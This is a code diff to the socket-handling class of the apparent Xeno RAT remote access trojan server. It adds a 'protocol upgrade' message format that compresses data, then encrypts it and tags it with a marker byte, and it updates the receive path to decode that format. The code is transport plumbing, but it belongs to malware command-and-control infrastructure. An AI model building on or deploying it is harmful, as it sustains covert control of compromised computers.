@@ -19,6 +19,7 @@ namespace xeno_rat_server
         public Socket sock;
         public byte[] EncryptionKey;
         public int socktimeout = 0;
+        private bool doProtocolUpgrade = false;
         public SocketHandler(Socket socket, byte[] _EncryptionKey) 
         {
             sock = socket;
@@ -32,9 +33,6 @@ namespace xeno_rat_server
             byte[] data = new byte[size];
             int total = 0;
             int dataLeft = size;
-            DateTime startTimestamp = DateTime.Now;
-            DateTime lastSendTime = DateTime.Now; // Initialize the last send time
-
             while (total < size)
             {
                 if (!sock.Connected)
@@ -130,30 +128,57 @@ namespace xeno_rat_server
 
             try
             {
-                data = Encryption.Encrypt(data, EncryptionKey);
-                byte[] compressedData = Compression.Compress(data);
-                byte didCompress = 0;
-                int orgLen = data.Length;
-
-                if (compressedData.Length < orgLen)
+                if (doProtocolUpgrade) 
                 {
-                    data = compressedData;
-                    didCompress = 1;
+                    byte[] compressedData = Compression.Compress(data);
+                    byte didCompress = 0;
+                    int orgLen = data.Length;
+
+                    if (compressedData != null && compressedData.Length < orgLen)
+                    {
+                        data = compressedData;
+                        didCompress = 1;
+                    }
+                    byte[] header = new byte[] { didCompress };
+                    if (didCompress == 1)
+                    {
+                        header = Concat(header, IntToBytes(orgLen));
+                    }
+                    data = Concat(header, data);
+                    data = Encryption.Encrypt(data, EncryptionKey);
+                    data = Concat(new byte[] { 3 }, data);//protocol upgrade byte
+                    byte[] size = IntToBytes(data.Length);
+                    data = Concat(size, data);
+
+                    return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
+                }
+                else 
+                {
+
+                    data = Encryption.Encrypt(data, EncryptionKey);
+                    byte[] compressedData = Compression.Compress(data);
+                    byte didCompress = 0;
+                    int orgLen = data.Length;
+
+                    if (compressedData.Length < orgLen)
+                    {
+                        data = compressedData;
+                        didCompress = 1;
+                    }
+
+                    byte[] header = new byte[] { didCompress };
+                    if (didCompress == 1)
+                    {
+                        header = Concat(header, IntToBytes(orgLen));
+                    }
+
+                    data = Concat(header, data);
+                    byte[] size = IntToBytes(data.Length);
+                    data = Concat(size, data);
+
+                    return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
                 }
 
-                byte[] header = new byte[] { didCompress };
-                if (didCompress == 1)
-                {
-                    header = Concat(header, IntToBytes(orgLen));
-                }
-
-                data = Concat(header, data);
-                byte[] size = IntToBytes(data.Length);
-                data = Concat(size, data);
-
-                await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None);
-
-                return true;
             }
             catch
             {
@@ -177,11 +202,39 @@ namespace xeno_rat_server
                     {
                         return null;//disconnect
                     }
-                    if (data[0] == 2)
+
+                    header Header;
+
+                    if (data[0] == 3)//protocol upgrade
+                    {
+                        if (!doProtocolUpgrade) 
+                        {
+                            doProtocolUpgrade = true;
+                        }
+                        data = BTruncate(data, 1);
+                        data = Encryption.Decrypt(data, EncryptionKey);
+                        if (data[0] == 2)
+                        {
+                            continue;
+                        }
+                        Header = ParseHeader(data);
+                        if (Header == null)
+                        {
+                            return null;//disconnect
+                        }
+                        data = BTruncate(data, Header.T_offset);
+                        if (Header.Compressed)
+                        {
+                            data = Compression.Decompress(data, Header.OriginalFileSize);
+                        }
+                        return data;
+                    }
+                    else if (data[0] == 2)
                     {
                         continue;
                     }
-                    header Header = ParseHeader(data);
+
+                    Header = ParseHeader(data);
                     if (Header == null)
                     {
                         return null;//disconnect
@@ -193,6 +246,7 @@ namespace xeno_rat_server
                     }
                     data = Encryption.Decrypt(data, EncryptionKey);
                     return data;
+
                 }
             }
             catch
